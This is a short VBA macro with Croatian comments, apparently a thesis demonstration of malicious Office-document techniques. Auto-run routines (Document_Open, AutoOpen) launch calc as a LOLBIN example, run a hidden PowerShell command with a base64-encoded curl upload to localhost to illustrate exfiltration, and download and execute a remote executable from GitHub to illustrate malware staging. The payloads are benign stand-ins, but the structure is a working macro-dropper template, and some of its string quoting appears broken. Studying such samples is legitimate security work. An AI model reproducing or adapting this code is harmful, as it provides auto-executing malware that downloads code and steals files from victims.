'pokretanje lokalnog binarya za primjer korištenja LOLBINa
Sub Document_Open()

Set objShell = CreateObject("Wscript.Shell")
objShell.Run "calc"


'upload calc.exe na localhost za primjer exfiltracije podataka
Dim Str As String
    Str = Str + "powershell.exe -nop -w hidden -e "Y3VybC5leGUgLVggUE9TVCBcIC1GICJma"" 
    Str = Str + "WxlPUBDOlxXaW5kb3dzXFN5c3RlbTMyXGNhbGMuZXhlIiBodHRwOi8vMTI3LjAuMC4xOjgwMDA=" 
    
    CreateObject("Wscript.Shell").Run Str
End Sub


'preuzimanje i pokretanje remote datoteke za primjer stageava u malwareima
Sub AutoOpen()

Shell ("cmd /c curl "https://github.com/acpwinters/Zavrsni_Rad/raw/main/calc.exe" --output p.exe && start p.exe")

End Sub
